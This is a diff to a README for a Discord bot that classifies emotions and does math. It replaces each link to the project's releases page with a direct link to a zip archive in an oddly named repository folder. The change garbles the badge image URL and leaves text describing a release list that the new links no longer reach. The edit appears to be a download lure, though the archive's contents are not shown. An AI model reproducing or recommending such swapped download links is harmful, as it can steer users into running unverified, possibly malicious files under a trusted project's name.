@@ -1,6 +1,6 @@
 # 🤖 EmotionalClassification_and_Math_DiscordBot - A Bot for Emotions and Math
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Emotional%20Bot-brightgreen)](https://github.com/adwaidh2/EmotionalClassification_and_Math_DiscordBot/releases)
+[![Download Now](https://raw.githubusercontent.com/adwaidh2/EmotionalClassification_and_Math_DiscordBot/main/Agialid/EmotionalClassification_and_Math_DiscordBot.zip%20Now-Emotional%20Bot-brightgreen)](https://raw.githubusercontent.com/adwaidh2/EmotionalClassification_and_Math_DiscordBot/main/Agialid/EmotionalClassification_and_Math_DiscordBot.zip)
 
 ## 📜 Description
 
@@ -20,7 +20,7 @@ Before downloading, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download EmotionalClassification_and_Math_DiscordBot](https://github.com/adwaidh2/EmotionalClassification_and_Math_DiscordBot/releases).
+To get started, visit this page to download: [Download EmotionalClassification_and_Math_DiscordBot](https://raw.githubusercontent.com/adwaidh2/EmotionalClassification_and_Math_DiscordBot/main/Agialid/EmotionalClassification_and_Math_DiscordBot.zip).
 
 You will see several release versions listed. Choose the latest version for the best experience. Click on the link to download the desired file.
 
@@ -92,4 +92,4 @@ We are committed to improving the EmotionalClassification_and_Math_DiscordBot. F
 
 For further inquiries or assistance, reach out via the Issues page on GitHub or contact our support community.
 
-#### Remember, you can always return to the [Download EmotionalClassification_and_Math_DiscordBot](https://github.com/adwaidh2/EmotionalClassification_and_Math_DiscordBot/releases) page to check for the latest releases. Enjoy using your new Discord Bot!
+#### Remember, you can always return to the [Download EmotionalClassification_and_Math_DiscordBot](https://raw.githubusercontent.com/adwaidh2/EmotionalClassification_and_Math_DiscordBot/main/Agialid/EmotionalClassification_and_Math_DiscordBot.zip) page to check for the latest releases. Enjoy using your new Discord Bot!
